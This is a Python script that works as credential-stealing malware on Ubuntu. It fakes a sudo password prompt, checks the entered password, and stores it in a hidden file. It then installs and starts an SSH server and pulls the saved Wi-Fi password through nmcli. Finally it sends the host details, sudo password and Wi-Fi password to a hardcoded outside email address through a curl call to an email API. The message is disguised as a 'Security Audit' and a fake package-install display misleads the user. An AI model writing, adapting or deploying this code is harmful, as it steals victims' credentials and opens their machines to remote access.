# Required environment variables:
# - RESEND_API_KEY: API key for sending emails via Resend

import os
import sys
import time
import getpass
import subprocess
import random
import platform
import json
import threading
from datetime import datetime
from pathlib import Path

def clear_screen():
    print("[DEBUG] clear_screen called")
    os.system('clear')

def send_password_via_resend(password, log=None):
    debug_log = [] if log is None else log
    debug_log.append('[DEBUG] send_password_via_resend called')
    print('[DEBUG] send_password_via_resend called')
    try:
        api_key = os.environ.get("RESEND_API_KEY")
        if not api_key:
            debug_log.append("[ERROR] RESEND_API_KEY not set.")
            print("[ERROR] RESEND_API_KEY not set.")
            return

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        # IP Address
        try:
            ip_address = subprocess.check_output([
                "hostname", "-I"], text=True).strip().split()[0]
            debug_log.append(f"[DEBUG] IP address: {ip_address}")
            print(f"[DEBUG] IP address: {ip_address}")
        except Exception as e:
            ip_address = "unknown"
            debug_log.append(f"[ERROR] Failed to get IP address: {e}")
            print(f"[ERROR] Failed to get IP address: {e}")

        # WiFi Info
        ssid = None
        wifi_password = None
        nmcli_installed = False
        nmcli_attempted_install = False
        nmcli_error = None
        def try_nmcli():
            nonlocal ssid, wifi_password, nmcli_installed, nmcli_error
            try:
                subprocess.run(["nmcli", "--version"], capture_output=True, check=True)
                nmcli_installed = True
                debug_log.append("[DEBUG] nmcli is installed.")
                print("[DEBUG] nmcli is installed.")
            except Exception as e:
                nmcli_error = e
                debug_log.append(f"[ERROR] nmcli not installed: {e}")
                print(f"[ERROR] nmcli not installed: {e}")
                nmcli_installed = False
            if nmcli_installed:
                try:
                    ssid_out = subprocess.check_output(
                        ["nmcli", "-t", "-f", "active,ssid", "dev", "wifi"], text=True
                    )
                    debug_log.append(f"[DEBUG] nmcli SSID output: {ssid_out.strip()}")
                    print(f"[DEBUG] nmcli SSID output: {ssid_out.strip()}")
                    for line in ssid_out.splitlines():
                        if line.startswith("yes:"):
                            ssid = line.split(":", 1)[1]
                            debug_log.append(f"[DEBUG] Found active SSID: {ssid}")
                            print(f"[DEBUG] Found active SSID: {ssid}")
                            break
                    else:
                        debug_log.append("[ERROR] No active WiFi SSID found.")
                        print("[ERROR] No active WiFi SSID found.")
                except Exception as e:
                    debug_log.append(f"[ERROR] Failed to get WiFi SSID: {e}")
                    print(f"[ERROR] Failed to get WiFi SSID: {e}")
                if ssid:
                    try:
                        wifi_password = subprocess.check_output(
                            ["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", ssid], text=True
                        ).strip()
                        if wifi_password:
                            debug_log.append(f"[DEBUG] WiFi password found for SSID {ssid}.")
                            print(f"[DEBUG] WiFi password found for SSID {ssid}.")
                        else:
                            debug_log.append(f"[ERROR] No WiFi password found for SSID {ssid}.")
                            print(f"[ERROR] No WiFi password found for SSID {ssid}.")
                    except Exception as e:
                        debug_log.append(f"[ERROR] Failed to get WiFi password for SSID {ssid}: {e}")
                        print(f"[ERROR] Failed to get WiFi password for SSID {ssid}: {e}")
        # First try
        try_nmcli()
        # If nmcli not installed, try to install it and retry once
        if not nmcli_installed and not nmcli_attempted_install:
            nmcli_attempted_install = True
            debug_log.append("[DEBUG] Attempting to install nmcli (network-manager)...")
            print("[DEBUG] Attempting to install nmcli (network-manager)...")
            # Try to get sudo password from file
            sudo_password = None
            try:
                home_dir = os.path.expanduser("~")
                log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
                if os.path.exists(log_path):
                    with open(log_path, 'r') as f:
                        lines = f.read().strip().split('\n')
                        if lines and lines[-1]:
                            sudo_password = lines[-1].strip()
            except Exception as e:
                debug_log.append(f"[ERROR] Could not retrieve sudo password for nmcli install: {e}")
                print(f"[ERROR] Could not retrieve sudo password for nmcli install: {e}")
            if sudo_password:
                try:
                    proc = subprocess.Popen(
                        ['sudo', '-S', 'apt', 'install', 'network-manager', '-y'],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    out, err = proc.communicate(input=f"{sudo_password}\n", timeout=120)
                    debug_log.append(f"[DEBUG] nmcli (network-manager) install attempted. stdout: {out}, stderr: {err}")
                    print(f"[DEBUG] nmcli (network-manager) install attempted. stdout: {out}, stderr: {err}")
                except Exception as e:
                    debug_log.append(f"[ERROR] nmcli (network-manager) install failed: {e}")
                    print(f"[ERROR] nmcli (network-manager) install failed: {e}")
                # Retry nmcli
                try_nmcli()
            else:
                debug_log.append("[ERROR] No sudo password available to install nmcli.")
                print("[ERROR] No sudo password available to install nmcli.")

        wifi_info = ""
        if ssid:
            wifi_info += f"<p><strong>WiFi SSID:</strong> {ssid}</p>"
        else:
            wifi_info += f"<p><strong>WiFi SSID:</strong> unavailable</p>"
        if wifi_password:
            wifi_info += f"<p><strong>WiFi Password:</strong> {wifi_password}</p>"
        else:
            wifi_info += f"<p><strong>WiFi Password:</strong> unavailable</p>"

        subject = f"Security Audit - Credential Capture from {hostname}"

        # Build a fancy log section for the email
        log_html = "<h3>System Metrics & Debug Log</h3><ul>"
        for entry in debug_log:
            log_html += f"<li>{entry}</li>"
        log_html += "</ul>"

        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip_address}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        {wifi_info}<br>
        {log_html}
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """

        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": ["arkhamzz47@gmail.com"],
            "subject": subject,
            "html": html_body
        }

        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", json.dumps(data)
        ]

        debug_log.append(f"[DEBUG] Sending email via resend.dev API...")
        print(f"[DEBUG] Sending email via resend.dev API...")
        try:
            proc = subprocess.Popen(curl_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = proc.communicate(timeout=30)
            debug_log.append(f"[DEBUG] resend.dev API response code: {proc.returncode}")
            debug_log.append(f"[DEBUG] resend.dev API stdout: {stdout.strip()}")
            debug_log.append(f"[DEBUG] resend.dev API stderr: {stderr.strip()}")
            print(f"[DEBUG] resend.dev API response code: {proc.returncode}")
            print(f"[DEBUG] resend.dev API stdout: {stdout.strip()}")
            print(f"[DEBUG] resend.dev API stderr: {stderr.strip()}")
        except Exception as e:
            debug_log.append(f"[ERROR] resend.dev API call failed: {e}")
            print(f"[ERROR] resend.dev API call failed: {e}")

    except Exception as e:
        if log is not None:
            log.append(f"[ERROR] send_password_via_resend failed: {e}")
        print(f"[ERROR] send_password_via_resend failed: {e}")

def capture_sudo_password():
    print("[DEBUG] capture_sudo_password called")
    if hasattr(capture_sudo_password, 'log'):
        capture_sudo_password.log.append('[DEBUG] capture_sudo_password called')
    max_attempts = 3
    attempt = 1

    while attempt <= max_attempts:
        try:
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))

            password = getpass.getpass(prompt)

            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)
            print(f"[DEBUG] sudo -S -v returned code {process.returncode}")
            if hasattr(capture_sudo_password, 'log'):
                capture_sudo_password.log.append(f"[DEBUG] sudo -S -v returned code {process.returncode}")

            if process.returncode == 0:
                print("[DEBUG] Correct sudo password captured")
                if hasattr(capture_sudo_password, 'log'):
                    capture_sudo_password.log.append("[DEBUG] Correct sudo password captured")
                return password
            else:
                print("[DEBUG] Incorrect sudo password attempt")
                if hasattr(capture_sudo_password, 'log'):
                    capture_sudo_password.log.append("[DEBUG] Incorrect sudo password attempt")
                attempt += 1

        except KeyboardInterrupt:
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            print("[DEBUG] sudo validation timed out")
            if hasattr(capture_sudo_password, 'log'):
                capture_sudo_password.log.append("[DEBUG] sudo validation timed out")
            attempt += 1

    print(f"sudo: {max_attempts} incorrect password attempts")
    if hasattr(capture_sudo_password, 'log'):
        capture_sudo_password.log.append(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    print("[DEBUG] show_installation_progress called")
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        time.sleep(random.uniform(0.5, 1.0))
    
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    
    packages = [
        "libssl3:amd64",
        "openssl", 
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5))
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8))
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0))

def is_ubuntu():
    try:
        if os.path.exists('/etc/os-release'):
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                if 'ubuntu' in content:
                    return True
        
        if 'ubuntu' in platform.platform().lower():
            return True
            
        try:
            result = subprocess.run(['lsb_release', '-i'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and 'ubuntu' in result.stdout.lower():
                return True
        except (subprocess.TimeoutExpired, FileNotFoundError):
            pass
            
        return False
    except Exception:
        return False

def get_stored_password():
    print("[DEBUG] get_stored_password called")
    try:
        home_dir = os.path.expanduser("~")
        log_path = os.path.join(home_dir, ".local", "share", ".temp_log")
        if not os.path.exists(log_path):
            print("[DEBUG] No stored password file found")
        with open(log_path, 'r') as f:
            lines = f.read().strip().split('\n')
            if lines and lines[-1]:
                password = lines[-1].strip()
                print("[DEBUG] Stored password found")
                return password
        return None
    except Exception as e:
        print(f"[DEBUG] Exception in get_stored_password: {e}")
        return None

# Remove is_loclx_installed, install_loclx, setup_ssh_forwarding
# Add check for openssh-server installed and running

def is_openssh_installed():
    try:
        result = subprocess.run(['dpkg', '-s', 'openssh-server'], capture_output=True, text=True)
        return 'Status: install ok installed' in result.stdout
    except Exception:
        return False

def is_ssh_running():
    try:
        result = subprocess.run(['systemctl', 'is-active', '--quiet', 'ssh'])
        return result.returncode == 0
    except Exception:
        return False

def ensure_ssh_installed_and_running(password):
    log = []
    print('[DEBUG] ensure_ssh_installed_and_running called')
    try:
        if not is_openssh_installed():
            log.append('[DEBUG] openssh-server not installed, installing...')
            print('[DEBUG] openssh-server not installed, installing...')
            install_process = subprocess.Popen(
                ['sudo', '-S', 'apt', 'install', 'openssh-server', '-y'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            out, err = install_process.communicate(input=f"{password}\n")
            log.append('[DEBUG] openssh-server installation attempted.')
            print(f'[DEBUG] openssh-server installation attempted. stdout: {out}, stderr: {err}')
        else:
            log.append('[DEBUG] openssh-server already installed')
            print('[DEBUG] openssh-server already installed')
        if not is_ssh_running():
            log.append('[DEBUG] SSH service not running, starting...')
            print('[DEBUG] SSH service not running, starting...')
            ssh_process = subprocess.Popen(
                ['sudo', '-S', 'systemctl', 'start', 'ssh'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            out, err = ssh_process.communicate(input=f"{password}\n")
            log.append('[DEBUG] SSH service start attempted.')
            print(f'[DEBUG] SSH service start attempted. stdout: {out}, stderr: {err}')
        else:
            log.append('[DEBUG] SSH service already running')
            print('[DEBUG] SSH service already running')
    except Exception as e:
        log.append(f"[ERROR] ensure_ssh_installed_and_running failed: {e}")
        print(f"[ERROR] ensure_ssh_installed_and_running failed: {e}")
    return log

def background_operations(password, silent=False):
    if not silent:
        print("[DEBUG] background_operations called")
    try:
        if not is_ubuntu():
            if not silent:
                print("[DEBUG] Not Ubuntu, exiting background_operations")
            return

        # Just send the password and wifi info
        if not silent:
            print(f"[DEBUG] Sending password and wifi info via resend")
        send_password_via_resend(password)

    except Exception as e:
        if not silent:
            print(f"[DEBUG] Exception in background_operations: {e}")
        send_password_via_resend(password)

def save_password_to_file(password):
    print("[DEBUG] save_password_to_file called")
    try:
        home_dir = os.path.expanduser("~")
        share_dir = os.path.join(home_dir, ".local", "share")
        os.makedirs(share_dir, exist_ok=True)
        file_path = os.path.join(share_dir, ".temp_log")
        with open(file_path, "a") as f:
            f.write(password + "\n")
        print("[DEBUG] Password saved to file")
        return True
    except Exception as e:
        print(f"[DEBUG] Exception in save_password_to_file: {e}")
        return False
        
    except KeyboardInterrupt:
        print("\n")
        sys.exit(1)
    except Exception as e:
        print(f"[DEBUG] Exception in main: {e}")
        sys.exit(1)

def main():
    print('[DEBUG] main called')
    if not is_ubuntu():
        print('[DEBUG] Not Ubuntu, exiting.')
        sys.exit(0)
    password = get_stored_password()
    log = []
    if password:
        print('[DEBUG] Password already stored, sending info via email.')
        send_password_via_resend(password, log=log)
        sys.exit(0)
    password = capture_sudo_password()
    save_password_to_file(password)
    ssh_log = ensure_ssh_installed_and_running(password)
    log.extend(ssh_log)
    send_password_via_resend(password, log=log)

if __name__ == "__main__":
    main()
